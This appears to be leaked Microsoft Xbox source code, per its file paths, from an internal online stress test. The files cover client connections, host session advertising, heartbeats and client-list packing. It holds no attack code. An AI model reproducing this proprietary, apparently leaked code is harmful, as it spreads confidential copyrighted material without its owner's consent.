	return m_OutgoingHeartbeatTimer.HasTimeExpired();
}

BOOL CClientConnection::GetRandomUserInfo(XUID *pUserXUID, CHAR *szUserName)
{
	DWORD dwUserDie = 0;

	if(m_UserVector.size() == 0)
		return FALSE;

	dwUserDie = (rand() % m_UserVector.size());

	m_UserVector[dwUserDie].GetUserInfo(pUserXUID, szUserName, NULL);

	return TRUE;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\ClientConnection.h ===
// ClientConnection.h: interface for the CClientConnection class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include <xtl.h>
#include <winsockx.h>
#include <stdio.h>
#include <xtestlib.h>
#include <xlog.h>
#include <xonlinep.h>
#include <vector>
#include "onlinetimer.h"
#include "sessionuser.h"

#define XONSTRESS_HEARTBEAT_TIMEOUT 60000
#define XONSTRESS_HEARTBEAT_XMIT_TIME 30000

#define XONSTRESS_MIN_CLIENT_SIZE  (sizeof(XONSTRESS_CLIENT_HEADER))
#define XONSTRESS_MAX_CLIENT_SIZE  (sizeof(XONSTRESS_CLIENT_HEADER) + XONLINE_MAX_LOGON_USERS * \
                                   (sizeof(XONSTRESS_USER_HEADER) + sizeof(XUID) + XONLINE_MAX_NAME_LENGTH + XONLINE_MAX_KINGDOM_LENGTH))

using namespace std;

class CClientConnection;

typedef vector <CClientConnection> XONSTRESS_CLIENTVECTOR, *PXONSTRESS_CLIENTVECTOR;
typedef vector <CSessionUser> XONSTRESS_USERVECTOR, *PXONSTRESS_USERVECTOR;

#pragma pack(push, 1)

// This structure frames client lists that are sent on the wire
typedef struct
{
	DWORD dwClientListSize;
	DWORD dwClientCount;
} XONSTRESS_CLIENTLIST_HEADER, *PXONSTRESS_CLIENTLIST_HEADER;

// This structure frames individual clients that are sent on the wire
typedef struct
{
	DWORD  dwClientSize;
	XNADDR ClientAddr;
	DWORD  dwUserCount;
	BYTE   bOperation;

#define XONSTRESS_CLIENT_ADD 0x01
#define XONSTRESS_CLIENT_DELETE 0x02

} XONSTRESS_CLIENT_HEADER, *PXONSTRESS_CLIENT_HEADER;

#pragma pack(pop)

class CClientConnection  
{
public:
	BOOL GetRandomUserInfo(XUID *pUserXUID, CHAR *szUserName);
	BOOL IsOutgoingHeartbeatExpired();
	BOOL IsIncomingHearbeatExpired();
	BOOL IsDisconnected();
	void SetAsDisconnected();
	void ResetOutgoingHeartbeatTimer();
	void ResetIncomingHeartbeatTimer();
	BOOL IsNew();
	void SetAsOld();
	void SetAsNew();
	SOCKET GetSocket();
	void SetSocket(SOCKET Socket);
	void ClearUsers();
	HRESULT AddUser(CSessionUser &);
	HRESULT UnpackFromBuffer(CHAR *pBuff, DWORD *pdwBuffSize);
	HRESULT PackIntoBuffer(CHAR *pBuff, DWORD *pdwBuffSize);
	bool operator <(CClientConnection &);
	bool operator ==(CClientConnection &);
	CClientConnection& operator = (const CClientConnection&);
	CClientConnection(const CClientConnection &);
	CClientConnection();
	virtual ~CClientConnection();
	
	XNADDR m_ClientAddr;

protected:
	COnlineTimer m_OutgoingHeartbeatTimer;
	COnlineTimer m_IncomingHeartbeatTimer;
	SOCKET m_ClientSocket;
	BOOL m_fDisconnected;
	BOOL m_fNew;
	XONSTRESS_USERVECTOR m_UserVector;
};
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\host.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       host.cpp
 *  Content:    Code for the host algorithm of the integrated online stress test
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  01/08/01    tristanj Created to hold all code related to the client stress algorithm
 *
 ****************************************************************************/

#include "onlinestress.h"

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;
extern CLogonTask *g_pLogonTask;
extern BOOL g_fExitTest;

/****************************************************************************
 *
 *  AdvertiseStressSession
 *
 *  Description:
 *      Sends a session creation/update request with the specified number of current
 *      and available slots.  It then pumps the task handle until completion.
 *
 *  Arguments:
 *      DWORD               dwPublicCurrent     Number of clients currently connected to the session
 *      DWORD               dwPublicAvailable   Number of client spaces still available in the session
 *      XNKID               *pSessionID         If the XNKID pointed to is set to all 0's, this is a
 *                                              session creation, otherwise update the session specified
 *                                              On exit, this will contain the returned XNKID
 *      XNKEY               *pKeyExchangeKey    On exit, this will contain the returned XNKEY
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT AdvertiseStressSession(CMatchSessionCreateTask *pSessionCreateTask, DWORD dwPublicCurrent, DWORD dwPublicAvailable, XNKID *pSessionID, XNKEY *pKeyExchangeKey)
{
	COnlineTimer Timer;
	HRESULT hr = S_OK;
	DWORD dwStartTick = 0, dwCurrentTick = 0;

	if(!pSessionCreateTask)
	{
		hr = E_FAIL;
		goto Exit;
	}

	pSessionCreateTask->SetAvailableSlots(dwPublicCurrent, dwPublicAvailable, 0, 0);

	// Start match session creation task
	if(!pSessionCreateTask->StartTask())
	{
		hr = E_FAIL;
		goto Exit;
	}

	Timer.SetAllowedTime(MAX_SESSION_CREATE_TIME);
	Timer.Start();

	// Pump task for MAX_SESSION_CREATE_TIME seconds
	while(!pSessionCreateTask->IsTaskComplete())
	{
		if(Timer.HasTimeExpired())
			break;

		g_pLogonTask->TaskContinue();
		pSessionCreateTask->TaskContinue();
	}

	if(!pSessionCreateTask->IsTaskComplete())
	{
		LOGTASKINFO(g_hLog, "Session creation timed-out");
		hr = E_FAIL;
		goto Exit;
	}

	pSessionCreateTask->GetSessionInfo(pSessionID, pKeyExchangeKey);

	if(*((ULONGLONG *) pSessionID) == 0)
	{
		LOGTASKINFO(g_hLog, "Session ID wasn't set");
		hr = E_FAIL;
		goto Exit;
	}

Exit:

	return hr;
}

/****************************************************************************
 *
 *  ProcessNewClients
 *
 *  Description:
 *      Check the host socket for incoming connection requests and add them to the client
 *      connection list.
 *
 *  Arguments:
 *      CListenSocket          *pListenSocket      The host socket that accepts incoming connections
 *      XONSTRESS_CLIENTVECTOR *pClientVector      The list to add new client connections to
 *      DWORD                  *pdwPublicCurrent   On input, indicates current number of connected clients.
 *                                                 On output, indicates the new number of connected clients.
 *      DWORD                  dwPublicAvailable   Indicates the number of client slots left that are available
 *                                                 for incoming connections
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT ProcessNewClients(CListenSocket *pListenSocket, XONSTRESS_CLIENTVECTOR *pClientVector, DWORD *pdwPublicCurrent, DWORD dwPublicAvailable)
{
	HRESULT hr = S_OK, hrLogon = S_OK;
	CClientConnection *pNewClient = NULL;
	SOCKET NewClientSock = INVALID_SOCKET;
	XNADDR NewClientAddr;
	XNKID NewClientId;
	DWORD dwClientCount = 0;

	memset(&NewClientAddr, 0, sizeof(NewClientAddr));
	memset(&NewClientId, 0, sizeof(NewClientId));

	// Loop and process all pending incoming connections
	while(((hr = pListenSocket->IsConnectionPending()) == S_OK) && dwPublicAvailable)
	{

		// Process any available incoming connections
		if(hr == S_OK)
		{
			hr = pListenSocket->AcceptIncomingClient(&NewClientSock, NULL, &NewClientAddr, &NewClientId);
			if(hr == S_OK)
			{
				pNewClient = new CClientConnection;
				pNewClient->SetSocket(NewClientSock);
				
				hr = ReadNewClientInfo(NewClientSock, pNewClient);
				if(hr != S_OK)
				{
					closesocket(NewClientSock);
					break;
				}
				
				TRACE(g_hLog, "Client at %02X%2X%02X%02X%02X%02X joined session", 
					pNewClient->m_ClientAddr.abEnet[0],
					pNewClient->m_ClientAddr.abEnet[1],
					pNewClient->m_ClientAddr.abEnet[2],
					pNewClient->m_ClientAddr.abEnet[3],
					pNewClient->m_ClientAddr.abEnet[4],
					pNewClient->m_ClientAddr.abEnet[5]);

				// Do one final check to verify that the client and the server see
				// the address the same.  Otherwise, other clients won't be able to see
				// this client
				if(memcmp(&NewClientAddr, &(pNewClient->m_ClientAddr), sizeof(NewClientAddr)))
				{
					LOGTASKINFO(g_hLog, "Address seen by host and that reported by client are different!");
					return E_FAIL;
				}

				pNewClient->SetAsNew();

				// Add a copy of the client to the vector
				pClientVector->push_back(*pNewClient);
				++(*pdwPublicCurrent);
				--dwPublicAvailable;

				// Remove the original client
				delete pNewClient;
				pNewClient = NULL;

			}

			// Since reading the client information could take time,
			// go ahead and process the logon task for 100 ms
			if(FAILED(hrLogon = WaitAndPump(GetTickCount() + 100, g_pLogonTask)))
			{
				LOGTASKINFOHR(g_hLog, "Online task handle failed", hrLogon);
				hr = E_FAIL;
				break;
			}
		}
		
		// If there were no incoming connections pending, then we're done
		// Don't use else if because the accept phase could return S_FALSE as well
		if(hr == S_FALSE)
		{
			hr = S_OK;
			break;
		}
		// Otherwise, we received some error code
		else
			break;;
	}

	// Clean up any leftover client object
	if(pNewClient)
		delete pNewClient;

	return hr;
}


/****************************************************************************
 *
 *  ProcessIncomingHeartbeats
 *
 *  Description:
 *      Check the currently connected clients and process any incoming heartbeats
 *
 *  Arguments:
 *      XONSTRESS_CLIENTVECTOR *pClientVector      The list of client connections to process for heartbeats
 *
 *  Returns:  
 *      S_OK on success
 *      E_FAIL on system failure
 *
 ****************************************************************************/
HRESULT ProcessIncomingHeartbeats(XONSTRESS_CLIENTVECTOR *pClientVector)
{
	COnlineTimer ReadTimer;
	XONSTRESS_CLIENTVECTOR::iterator ClientCurrent, ClientEnd;
	fd_set readfds;
	INT nActiveSockets = 0;
	HRESULT hr = S_OK, hrLogon = S_OK;
    TIMEVAL sTimeout = {0, 0}; 
	DWORD dwHeartbeat = 0;
	BOOL fSocketsToProcess = FALSE;
	
	ReadTimer.SetAllowedTime(XONSTRESS_HOST_RECV_TIME);

	while(TRUE)
	{
		FD_ZERO(&readfds);

		// Loop through all users in the user vector and add to the total required size for the client packet
		for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
		{
			FD_SET(ClientCurrent->GetSocket(), &readfds);
			fSocketsToProcess = TRUE;
		}
		
		if(!fSocketsToProcess)
		{
			hr = S_OK;
			goto Exit;
		}

		nActiveSockets = select(0, &readfds, NULL, NULL, &sTimeout);
		
		if(nActiveSockets <= 0)
		{
			hr = S_OK;
			goto Exit;
		}
		
//		TRACE(g_hLog, "Data pending from %u clients", nActiveSockets);

		// Loop through all clients in the client vector and read any pending heartbeats
		for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
		{
			// Handle data on the socket
			if(FD_ISSET(ClientCurrent->GetSocket(), &readfds))
			{
				hr = ReadPacket(ClientCurrent->GetSocket(), (CHAR *) &dwHeartbeat, sizeof(DWORD), &ReadTimer);
				if(FAILED(hr))
				{
					LOGTASKINFO(g_hLog, "A socket error occured on a client, marking as disconnected");
					ClientCurrent->SetAsDisconnected();
					hr = S_OK;
					continue;
				}
				else if(hr == S_OK)
				{
					// If the received message wasn't a heartbeat, then there was a socket error, so fail
					if(dwHeartbeat != sizeof(DWORD))
					{
						LOGTASKINFO(g_hLog, "An unexpected message was received from a client, marking as disconnected");
						ClientCurrent->SetAsDisconnected();
						continue;
					}
					else
					{
						ClientCurrent->ResetIncomingHeartbeatTimer();
					}
				}
				else if(hr == S_FALSE)
				{
					TRACE(g_hLog, "Timed out reading info from client");
				}

			}
		}
		
		hr = S_OK;

		// Since reading the client information could take time,
		// go ahead and process the logon task for 100 ms
		if(FAILED(hrLogon = WaitAndPump(GetTickCount() + 100, g_pLogonTask)))
		{
			LOGTASKINFOHR(g_hLog, "Online task handle failed", hrLogon);
			hr = E_FAIL;
			break;
		}
	}

Exit:

	return hr;
}

/****************************************************************************
 *
 *  ProcessDisconnectedClients
 *
 *  Description:
 *      Check the currently connected clients and process any incoming heartbeats
 *
 *  Arguments:
 *      XONSTRESS_CLIENTVECTOR *pClientVector      The list of client connections to check for disconnections
 *      DWORD                  *pdwPublicCurrent   Number of public slots currently available in this session
 *
 *  Returns:  
 *      S_OK on success
 *      E_FAIL on system failure
 *
 ****************************************************************************/
HRESULT ProcessDisconnectedClients(XONSTRESS_CLIENTVECTOR *pClientVector, DWORD *pdwNewPublicCurrent)
{
	XONSTRESS_CLIENTVECTOR::iterator ClientCurrent, ClientEnd;

	// Loop through all clients in the client vector and mark any that haven't responded
	// within the timeout interval as disconnected (this also closes the socket)
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		if(!ClientCurrent->IsDisconnected())
		{
			if(ClientCurrent->IsIncomingHearbeatExpired())
			{
				TRACE(g_hLog, "Client at %02X%2X%02X%02X%02X%02X timed out", 
					ClientCurrent->m_ClientAddr.abEnet[0],
					ClientCurrent->m_ClientAddr.abEnet[1],
					ClientCurrent->m_ClientAddr.abEnet[2],
					ClientCurrent->m_ClientAddr.abEnet[3],
					ClientCurrent->m_ClientAddr.abEnet[4],
					ClientCurrent->m_ClientAddr.abEnet[5]);

				LOGTASKINFO(g_hLog, "Timed out waiting for client");
				ClientCurrent->SetAsDisconnected();

				--(*pdwNewPublicCurrent);
			}
		}
	}

	return S_OK;
}

/****************************************************************************
 *
 *  BuildFullClientList
 *
 *  Description:
 *      Go through the client vector and add all new and existing users to the
 *      full client list buffer which will be transmitted to remote clients
 *
 *  Arguments:
 *      XONSTRESS_CLIENTVECTOR *pClientVector      The list of client connections to add to the list packet
 *      CHAR                   *pBuff              Buffer to hold the client/user information.  If this
 *                                                 parameter is NULL and a non-NULL pdwBuffSize is
 *                                                 provided, then the function will fill pdwBuffSize
 *                                                 with the required size necessary
 *      DWORD                  *pdwBuffSize        Holds the size of the provided buffer. On output
 *                                                 this parameter will contain either the required size
 *                                                 (if the provided size was insufficient) or the
 *                                                 ammount of space that was actually used
 *
 *  Returns:  
 *      S_OK on success
 *      S_FALSE if the provided buffer was too small
 *      E_FAIL on system failure
 *
 ****************************************************************************/
HRESULT BuildFullClientList(XONSTRESS_CLIENTVECTOR *pClientVector, CHAR *pBuff, DWORD *pdwBuffSize)
{
	PXONSTRESS_CLIENTLIST_HEADER pClientListHeader = (PXONSTRESS_CLIENTLIST_HEADER) pBuff;
	XONSTRESS_CLIENTVECTOR::iterator ClientCurrent, ClientEnd;
	HRESULT hr = S_OK;
	DWORD dwCurrentClientSize = 0, dwRequiredSize = 0, dwClientCount = 0, dwUsedSize = 0;

	if(!pClientVector || !pdwBuffSize)
	{
		hr = E_FAIL;
		goto Exit;
	}

	dwRequiredSize += sizeof(XONSTRESS_CLIENTLIST_HEADER);

	// Loop through all clients in the client vector and determine the required list size
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		// Don't count disconnected clients since they won't be included in the full list
		if(ClientCurrent->IsDisconnected())
			continue;

		dwCurrentClientSize = 0;

		hr = ClientCurrent->PackIntoBuffer(NULL, &dwCurrentClientSize);

		dwRequiredSize += dwCurrentClientSize;
		++dwClientCount;
	}

	if(*pdwBuffSize < dwRequiredSize)
	{
		*pdwBuffSize = dwRequiredSize;
		hr = S_FALSE;
		goto Exit;
	}

	if(!pBuff)
	{
		hr = E_FAIL;
		goto Exit;
	}

	pClientListHeader->dwClientCount = dwClientCount;
	pClientListHeader->dwClientListSize = dwRequiredSize;
	dwUsedSize += sizeof(XONSTRESS_CLIENTLIST_HEADER);

	// Loop through all clients in the client vector and pack them into the buffer
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		// Don't count disconnected clients since they won't be include in the full list
		if(ClientCurrent->IsDisconnected())
			continue;

		dwCurrentClientSize = dwRequiredSize - dwUsedSize;

		hr = ClientCurrent->PackIntoBuffer(pBuff + dwUsedSize, &dwCurrentClientSize);

		dwUsedSize += dwCurrentClientSize;
	}

Exit:

	return hr;
}

/****************************************************************************
 *
 *  BuildUpdateClientList
 *
 *  Description:
 *      Go through the client vector and add all new and disconnected users to
 *      the full client list buffer which will be transmitted to remote clients
 *
 *  Arguments:
 *      XONSTRESS_CLIENTVECTOR *pClientVector      The list of client connections to add to the list packet
 *      CHAR                   *pBuff              Buffer to hold the client/user information.  If this
 *                                                 parameter is NULL and a non-NULL pdwBuffSize is
 *                                                 provided, then the function will fill pdwBuffSize
 *                                                 with the required size necessary
 *      DWORD                  *pdwBuffSize        Holds the size of the provided buffer. On output
 *                                                 this parameter will contain either the required size
 *                                                 (if the provided size was insufficient) or the
 *                                                 ammount of space that was actually used
 *
 *  Returns:  
 *      S_OK on success
 *      S_FALSE if the provided buffer was too small
 *      E_FAIL on system failure
 *
 ****************************************************************************/
HRESULT BuildUpdateClientList(XONSTRESS_CLIENTVECTOR *pClientVector, CHAR *pBuff, DWORD *pdwBuffSize)
{
	PXONSTRESS_CLIENTLIST_HEADER pClientListHeader = (PXONSTRESS_CLIENTLIST_HEADER) pBuff;
	XONSTRESS_CLIENTVECTOR::iterator ClientCurrent, ClientEnd;
	HRESULT hr = S_OK;
	DWORD dwCurrentClientSize = 0, dwRequiredSize = 0, dwClientCount = 0, dwUsedSize = 0;

	if(!pClientVector || !pdwBuffSize)
	{
		hr = E_FAIL;
		goto Exit;
	}

	dwRequiredSize += sizeof(XONSTRESS_CLIENTLIST_HEADER);

	// Loop through all clients in the client vector and determine the required list size
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		// Don't count existing clients since they won't be included in the update list
		if(!ClientCurrent->IsDisconnected() && !ClientCurrent->IsNew())
			continue;

		dwCurrentClientSize = 0;

		hr = ClientCurrent->PackIntoBuffer(NULL, &dwCurrentClientSize);

		dwRequiredSize += dwCurrentClientSize;
		++dwClientCount;
	}

	if(*pdwBuffSize < dwRequiredSize)
	{
		*pdwBuffSize = dwRequiredSize;
		hr = S_FALSE;
		goto Exit;
	}

	if(!pBuff)
	{
		hr = E_FAIL;
		goto Exit;
	}

	pClientListHeader->dwClientCount = dwClientCount;
	pClientListHeader->dwClientListSize = dwRequiredSize;
	dwUsedSize += sizeof(XONSTRESS_CLIENTLIST_HEADER);

	// Loop through all clients in the client vector and pack them into the buffer
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		// Don't count existing clients since they won't be included in the update list
		if(!ClientCurrent->IsDisconnected() && !ClientCurrent->IsNew())
			continue;

		dwCurrentClientSize = dwRequiredSize - dwUsedSize;

		hr = ClientCurrent->PackIntoBuffer(pBuff + dwUsedSize, &dwCurrentClientSize);

		dwUsedSize += dwCurrentClientSize;
	}

Exit:

	return hr;
}

/****************************************************************************
 *
 *  ProcessListChangesAndHeartbeats
 *
 *  Description:
 *      Builds lists of client/user changes and sends them to the appropriate clients
 *      If there is no list to send, and the outgoing heartbeat timer has expired,
 *      then sends a heartbeat to the appropriate clients
 *
 *  Arguments:
 *      XONSTRESS_CLIENTVECTOR *pClientVector      The list of client connections to check for disconnections
 *
 *  Returns:  
 *      S_OK on success
 *      E_FAIL on system failure
 *
 ****************************************************************************/
HRESULT ProcessListChangesAndHeartbeats(XONSTRESS_CLIENTVECTOR *pClientVector)
{
	COnlineTimer SendTimer;
	XONSTRESS_CLIENTVECTOR::iterator ClientCurrent, ClientEnd;
	HRESULT hr = S_OK;
	CHAR *pFullClientList = NULL, *pUpdateClientList = NULL;
	DWORD dwFullListSize = 0, dwUpdateListSize = 0, dwOutgoingHeartbeat = sizeof(DWORD);
	BOOL fNewClientsExist = FALSE;
	BOOL fDisconnectedClientsExist = FALSE;

	SendTimer.SetAllowedTime(XONSTRESS_HOST_SEND_TIME);

	// Loop through all clients in the client vector and see if any are new or disconnected
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		if(ClientCurrent->IsNew())
			fNewClientsExist = TRUE;

		if(ClientCurrent->IsDisconnected())
			fDisconnectedClientsExist = TRUE;
	}

	// If there are new clients, then build the full client list for those clients
	if(fNewClientsExist)
	{
		// Determine the required size of the list
		if(FAILED(BuildFullClientList(pClientVector, NULL, &dwFullListSize)))
		{
			LOGTASKINFO(g_hLog, "Failed to create the full client list");
			hr = E_FAIL;
			goto Exit;
		}

		// Allocate the list
		pFullClientList = new CHAR[dwFullListSize];

		// Build the full list
		if(FAILED(BuildFullClientList(pClientVector, pFullClientList, &dwFullListSize)))
		{
			LOGTASKINFO(g_hLog, "Failed to create the full client list");
			hr = E_FAIL;
			goto Exit;
		}
	}
	
	// If there have been client list changes, then build a list of changes to send to existing clients
	if(fNewClientsExist || fDisconnectedClientsExist)
	{
		// Build the update list
		if(FAILED(BuildUpdateClientList(pClientVector, NULL, &dwUpdateListSize)))
		{
			LOGTASKINFO(g_hLog, "Failed to create the update client list");
			hr = E_FAIL;
			goto Exit;
		}

		// Allocate the list
		pUpdateClientList = new CHAR[dwUpdateListSize];

		// Build the update list
		if(FAILED(BuildUpdateClientList(pClientVector, pUpdateClientList, &dwUpdateListSize)))
		{
			LOGTASKINFO(g_hLog, "Failed to create the update client list");
			hr = E_FAIL;
			goto Exit;
		}
	}

	// Removed deleted clients from the list
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		if(ClientCurrent->IsDisconnected())
		{
			pClientVector->erase(ClientCurrent);
		}
	}

	// Send lists and heartbeats to the appropriate clients
	for(ClientCurrent = pClientVector->begin(), ClientEnd = pClientVector->end(); ClientCurrent != ClientEnd; ++ClientCurrent)
	{
		// If the client disconnected, then don't send any list data
		if(ClientCurrent->IsDisconnected())
			continue;

		// If the client is new, then send a full list update
		if(ClientCurrent->IsNew())
		{
			TRACE(g_hLog, "Sending full list (%u bytes) to client at %02X%2X%02X%02X%02X%02X", 
				dwFullListSize,
				ClientCurrent->m_ClientAddr.abEnet[0],
				ClientCurrent->m_ClientAddr.abEnet[1],
				ClientCurrent->m_ClientAddr.abEnet[2],
				ClientCurrent->m_ClientAddr.abEnet[3],
				ClientCurrent->m_ClientAddr.abEnet[4],
				ClientCurrent->m_ClientAddr.abEnet[5]);

			// Don't worry about if the send fails, since the lack of heartbeat will cause this client
			// to be removed eventually anyway
			if((hr = SendPacket(ClientCurrent->GetSocket(), pFullClientList, (INT) dwFullListSize, &SendTimer)) != S_OK)
			{
				TRACE(g_hLog, "Send failed with 0x%08x", hr);
				hr = S_OK;
			}

			ClientCurrent->SetAsOld();
			ClientCurrent->ResetOutgoingHeartbeatTimer();
		}
		// If the client is old and there were list changes, then send the updates
		else if(fNewClientsExist || fDisconnectedClientsExist)
		{
			TRACE(g_hLog, "Sending updated list (%u bytes) to client at %02X%2X%02X%02X%02X%02X", 
				dwUpdateListSize,
				ClientCurrent->m_ClientAddr.abEnet[0],
				ClientCurrent->m_ClientAddr.abEnet[1],
				ClientCurrent->m_ClientAddr.abEnet[2],
				ClientCurrent->m_ClientAddr.abEnet[3],
				ClientCurrent->m_ClientAddr.abEnet[4],
				ClientCurrent->m_ClientAddr.abEnet[5]);

			// Don't worry about if the send fails, since the lack of heartbeat will cause this client
			// to be removed eventually anyway
			if((hr = SendPacket(ClientCurrent->GetSocket(), pUpdateClientList, (INT) dwUpdateListSize, &SendTimer)) != S_OK)
			{
				TRACE(g_hLog, "Send failed with 0x%08x", hr);
				hr = S_OK;
			}

			ClientCurrent->ResetOutgoingHeartbeatTimer();
		}
		// Otherwise, if an outgoing heartbeat is due, send one
		else if(ClientCurrent->IsOutgoingHeartbeatExpired())
		{
//			TRACE(g_hLog, "Sending heartbeat (%u bytes) to client at %02X%2X%02X%02X%02X%02X",
//				sizeof(DWORD),
//				ClientCurrent->m_ClientAddr.abEnet[0],
//				ClientCurrent->m_ClientAddr.abEnet[1],
//				ClientCurrent->m_ClientAddr.abEnet[2],
//				ClientCurrent->m_ClientAddr.abEnet[3],
//				ClientCurrent->m_ClientAddr.abEnet[4],
//				ClientCurrent->m_ClientAddr.abEnet[5]);
			// Don't worry about if the send fails, since the lack of heartbeat will cause this client
			// to be removed eventually anyway
			if((hr = SendPacket(ClientCurrent->GetSocket(), (CHAR *) &dwOutgoingHeartbeat, sizeof(DWORD), &SendTimer)) != S_OK)
			{
				TRACE(g_hLog, "Send failed with 0x%08x", hr);
				hr = S_OK;
			}
			ClientCurrent->ResetOutgoingHeartbeatTimer();
		}
	}

Exit:

	pFullClientList ? delete [] pFullClientList : 0;
	pUpdateClientList ? delete [] pUpdateClientList : 0;

	return hr;
}

/****************************************************************************
 *
 *  host_Main
 *
 *  Description:
 *      Master algorithm for the online stress host
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/
HRESULT host_Main( void )
{
	XONSTRESS_CLIENTVECTOR ClientVector;
	XONLINE_ATTRIBUTE AttributesArray[1];
	CMatchSessionCreateTask SessionCreateTask;
	COnlineTimer HostWaitTimer, SessionRefreshTimer;
	CListenSocket *pListenSocket = NULL;
    HRESULT hr = S_OK;
	DWORD dwPublicCurrent = 0, dwNewPublicCurrent = 0, dwAttributesCount = (sizeof(AttributesArray) / sizeof(XONLINE_ATTRIBUTE));
	XNKID SessionID;
	XNKEY KeyExchangeKey;

	AttributesArray[0].dwAttributeID = XONLINESTRESS_SESSION_PARAM;
	AttributesArray[0].info.integer.qwValue = XONLINESTRESS_SESSION_VALUE;
	AttributesArray[0].fChanged = TRUE;
	
	SessionCreateTask.RegisterLogHandle(g_hLog);
	SessionCreateTask.SetAttributes(AttributesArray, dwAttributesCount);

	memset(&SessionID, 0, sizeof(XNKID));
	memset(&KeyExchangeKey, 0, sizeof(XNKEY));

    //
    // Create and advertise a new session on the match server
    //
	hr = AdvertiseStressSession(&SessionCreateTask, dwPublicCurrent, DEFAULT_SLOTS_AVAILABLE - dwPublicCurrent, &SessionID, &KeyExchangeKey);
	if(hr != S_OK)
		goto Exit;

	//
	// Register the host's key information
	//
	if(XNetRegisterKey(&SessionID, &KeyExchangeKey))
	{
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Create a socket to listen for incoming clients
	//
	hr = CreateListenSocket(&pListenSocket, &SessionID, &KeyExchangeKey);
	if(hr != S_OK)
		goto Exit;

	//
	// Start main host loop
	// 

	HostWaitTimer.SetAllowedTime(XONSTRESS_HOST_WAIT_TIME);
	SessionRefreshTimer.SetAllowedTime(XONSTRESS_SESSION_REFRESH_TIME);
	SessionRefreshTimer.Start();

	while(SUCCEEDED(hr) && !g_fExitTest)
	{
		//
		// Process new client connections incoming from the host socket
		//
		dwNewPublicCurrent = dwPublicCurrent;
		hr = ProcessNewClients(pListenSocket, &ClientVector, &dwNewPublicCurrent, DEFAULT_SLOTS_AVAILABLE - dwNewPublicCurrent);
		// We expect either S_OK or S_FALSE if there wasn't a network error
		if(FAILED(hr))
			goto Exit;

		if(dwNewPublicCurrent > DEFAULT_SLOTS_AVAILABLE)
			goto Exit;

		//
		// If new clients have connected update the session advertisement to reflect the new number of slots available
		//
		if(dwNewPublicCurrent > dwPublicCurrent)
		{
			dwPublicCurrent = dwNewPublicCurrent;
	
			hr = AdvertiseStressSession(&SessionCreateTask, dwPublicCurrent, DEFAULT_SLOTS_AVAILABLE - dwPublicCurrent, &SessionID, &KeyExchangeKey);
			if(hr != S_OK)
				goto Exit;
		}

		//
		// Process new client heartbeats incoming from the client connections
		//
		hr = ProcessIncomingHeartbeats(&ClientVector);
		if(hr != S_OK)
			goto Exit;

		//
		// Process new client disconnects
		//
		dwNewPublicCurrent = dwPublicCurrent;
		hr = ProcessDisconnectedClients(&ClientVector, &dwNewPublicCurrent);
		if(hr != S_OK)
			goto Exit;

		//
		// If new clients have connected update the session advertisement to reflect the new number of slots available
		//
		if(dwNewPublicCurrent < dwPublicCurrent)
		{
			dwPublicCurrent = dwNewPublicCurrent;
	
			hr = AdvertiseStressSession(&SessionCreateTask, dwPublicCurrent, DEFAULT_SLOTS_AVAILABLE - dwPublicCurrent, &SessionID, &KeyExchangeKey);
			if(hr != S_OK)
				goto Exit;
		}

		//
		// Send list changes and heartbeats to clients
		//
		hr = ProcessListChangesAndHeartbeats(&ClientVector);
		if(hr != S_OK)
			goto Exit;

		// Wait for XONSTRESS_HOST_WAIT_TIME seconds to throttle the speed at which connections and disconnections occur
		HostWaitTimer.Start();
		while(!HostWaitTimer.HasTimeExpired())
		{
			Sleep(0);
		}

		// Keep the session advertisement from being erased by refreshing it every 15 minutes
		if(SessionRefreshTimer.HasTimeExpired())
		{
			hr = AdvertiseStressSession(&SessionCreateTask, dwPublicCurrent, DEFAULT_SLOTS_AVAILABLE - dwPublicCurrent, &SessionID, &KeyExchangeKey);
			if(hr != S_OK)
				goto Exit;
		}

		PUMPLOGONHANDLE();
	}

Exit:

	//
	// Close the host socket and client connections
	//
	pListenSocket ? delete pListenSocket : 0;


    //
    // Return the Hresult
    //

    return hr;
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\inc\svrsim.h ===
/*----------------------------------------------------------------------------
 *  Copyright  1997 Microsoft.  ALL RIGHTS RESERVED. 
 *----------------------------------------------------------------------------
 *  Date: 10/24/00
 *  Developer: Sean Wohlgemuth
 *----------------------------------------------------------------------------
 */

#define MAX_RESPONSE_BUFFER 2048

class svrsim{

public:
	//constructor
	svrsim();
	//destructor
	~svrsim();

public:
	//set response from buffer; rgchBuffer is data; dwcBuffer is number of buffer bytes to send
